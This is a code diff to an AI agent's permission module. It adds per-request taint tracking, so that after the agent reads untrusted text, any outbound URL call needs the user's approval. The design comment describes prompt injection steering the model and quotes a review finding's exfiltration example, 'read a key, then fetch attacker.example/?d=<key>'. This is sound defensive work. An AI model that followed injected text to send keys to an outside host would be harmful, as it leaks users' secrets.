@@ -25,8 +25,11 @@ open-ended ("anything typed into Bear for the next 15 minutes") and shouldn't
 outlive the session that asked for it.
 """
 
+import contextvars
 import json
+import re
 import time
+import urllib.parse
 
 GRANT_DURATION = 15 * 60  # seconds an app stays drivable after one approval
 CONVERSATION_IDLE = 10 * 60  # seconds of silence that ends a conversation
@@ -180,3 +183,94 @@ def context_note() -> str:
         allowed = ", ".join(g["app"] for g in grants)
         lines.append(f"You currently have permission to control: {allowed}.")
     return "\n".join(lines)
+
+
+# --- the request in flight: what it has read (taint) ------------------------
+#
+# Once a request has put untrusted text in front of the model -- a file's
+# contents, the clipboard, a web page, a repository's text, a command's
+# output -- that text may be steering it. From then until the request ends,
+# any call that sends data out or opens a URL needs the user's yes, unless
+# the URL or its host is in the user's own words for this request (review
+# H1: "read a key, then fetch attacker.example/?d=<key>").
+#
+# Both halves are declared in the tool registry, not listed here or in the
+# dispatcher: "untrusted_output": True on a tool whose result carries such
+# text, "outbound": "<arg>" on a tool that contacts or opens that argument.
+#
+# The state is per request and lives in a ContextVar. agent_loop.run()
+# opens one; every dispatch() made while it runs -- the model's own calls
+# and every step of a skill, which dispatches from the same task -- sees
+# the same one. A second request running at the same time is a different
+# asyncio task and gets its own. A dispatch with no request around it (a
+# manual tool call from the UI, a timer) has no context and is never
+# tainted: nobody but the user chose its arguments.
+
+
+class Request:
+    __slots__ = ("user_text", "sources")
+
+    def __init__(self, user_text: str):
+        self.user_text = user_text or ""
+        self.sources = []  # tools whose untrusted output this request has seen
+
+    @property
+    def tainted(self) -> bool:
+        return bool(self.sources)
+
+
+_request: contextvars.ContextVar = contextvars.ContextVar("leutheria_request", default=None)
+
+
+def begin_request(user_text: str):
+    """Start tracking a request; returns a token for end_request()."""
+    return _request.set(Request(user_text))
+
+
+def end_request(token) -> None:
+    _request.reset(token)
+
+
+def current_request():
+    return _request.get()
+
+
+def mark_untrusted(source: str) -> None:
+    request = _request.get()
+    if request is not None and source not in request.sources:
+        request.sources.append(source)
+
+
+def _host_said(host: str, text: str) -> bool:
+    host = host.lower().rstrip(".")
+    bare = host[4:] if host.startswith("www.") else host
+    for candidate in {host, bare}:
+        if candidate and re.search(r"(?<![\w.-])" + re.escape(candidate) + r"(?![\w-])", text):
+            return True
+    return False
+
+
+def url_in_users_words(url: str, text: str) -> bool:
+    """Whether the user named this URL, or the site it goes to, themselves."""
+    text = (text or "").lower()
+    url = (url or "").strip() if isinstance(url, str) else ""
+    if not url or not text:
+        return False
+    if url.lower() in text:
+        return True
+    try:
+        host = urllib.parse.urlsplit(url if "://" in url else "https://" + url).hostname
+    except ValueError:
+        return False
+    return bool(host) and _host_said(host, text)
+
+
+def outbound_reason(url) -> str:
+    """Why a call to `url` needs a yes in the current request, or None."""
+    request = _request.get()
+    if request is None or not request.tainted:
+        return None
+    if url_in_users_words(url, request.user_text):
+        return None
+    read = ", ".join(s.replace("_", " ") for s in request.sources)
+    return f"this request already read text that could be steering me ({read}), and you didn't name this address: {url}"
